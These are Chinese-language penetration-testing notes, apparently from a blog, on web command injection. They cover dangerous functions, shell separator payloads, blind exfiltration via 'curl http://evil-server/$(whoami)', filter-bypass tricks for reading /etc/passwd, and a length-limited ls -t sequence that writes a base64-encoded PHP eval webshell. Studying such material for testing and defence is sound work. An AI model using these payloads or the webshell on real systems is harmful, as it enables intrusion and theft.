---
data: 2024-06-30
tags:
  - 外网打点
博客链接:
  - https:/www.cnblogs.com/Ho1dF0rward/p/18284886
关联:
  - "[[book/知识笔记/渗透/外网打点/基础漏洞/基础漏洞]]"
---
## 基础概念

命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。

## 危险函数

### php

~~~
system
exec
passthru
shell_exec
popen
proc_open
~~~
### Python

~~~
system
popen
subprocess.call
spawn
~~~
###  Java

~~~
java.lang.Runtime.getRuntime().exec(command)
~~~

## 命令注入执行符号

Windows 系统支持的管道符如下所示:

1. `|`: 直接执行后面的语句。例如: `ping 127.0.0.1 | whoami`。
2. `||`: 如果前面执行的语句执行出错,则执行后面的语句,前面的语句只能为假。例如: `ping 2 || whoami`。
3. `&`: 如果前面的语句为假则直接执行后面的语句,前面的语句可真可假。例如: `ping 127.0.0.1 & whoami`。
4. `&&`: 如果前面的语句为假则直接出错,也不执行后面的语句,前面的语句只能为真。例如: `ping 127.0.0.1 && whoami`。

Linux 系统支持的管道符如下所示:

1. `;`: 执行完前面的语句再执行后面的。例如: `ping 127.0.0.1; whoami`。
2. `|`: 显示后面语句的执行结果。例如: `ping 127.0.0.1 | whoami`。
3. `||`: 当前面的语句执行出错时,执行后面的语句。例如: `ping || whoami`。
4. `&`: 如果前面的语句为假则直接执行后面的语句,前面的语句可真可假。例如: `ping 127.0.0.1 & whoami`。
5. `&&`: 如果前面的语句为假则直接出错,也不执行后面的,前面的语句只能为真。例如: `ping 127.0.0.1 && whoami`。

## 无回显技巧

- bash反弹shell
- DNS带外数据
- http带外
    - `curl http://evil-server/$(whoami)`
    - `wget http://evil-server/$(whoami)`
- 无带外时利用 `sleep` 或其他逻辑构造布尔条件

## 绕过手法
#### 空格

- `<` 符号 `cat<123`
- `\t` / `%09`
- `${IFS}` 其中{}用来截断，比如cat`$IFS2会被认为IFS2是变量名。另外，在后面加个$`可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串

### 黑名单绕过

- `a=l;b=s;$a$b`
- base64 `echo "bHM=" | base64 -d`
- `/?in/?s` => `/bin/ls`
- 连接符 `cat /etc/pass'w'd`
- 未定义的初始化变量 `cat$x /etc/passwd`

### 长度限制

#### ls命令利用

`ls -t` 是 Linux/Unix 系统中 `ls` 命令的一个常用选项。它的作用是:

1. **按修改时间排序**: `ls -t` 会按照文件或目录的修改时间进行排序,最新修改的文件或目录会排在最前面。

注意因为是最新的在最前面所以是反过来的

~~~
>hp
>1.p\\
>d\>\\
>\ -\\
>e64\\
>bas\\
>7\|\\
>XSk\\
>Fsx\\
>dFV\\
>kX0\\
>bCg\\
>XZh\\
>AgZ\\
>waH\\
>PD9\\
>o\ \\
>ech\\
ls -t>0
sh 0
~~~

#### 通配符利用
通配符*，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数

~~~
>ls
>lss
>lsss
>1
*s       (等同于命令： ls lss lsss)
~~~

但是注意使用`*`要确保当前文件夹下文件名无干扰

## 文件名寻找

使用正确的通配符
~~~
* 0到无穷个任意字符
? 一个任意字符
[ ] 一个在括号内的字符，e.g. [abcd]
[ - ] 在编码顺序内的所有字符
[^ ] 一个不在括号内的字符
~~~

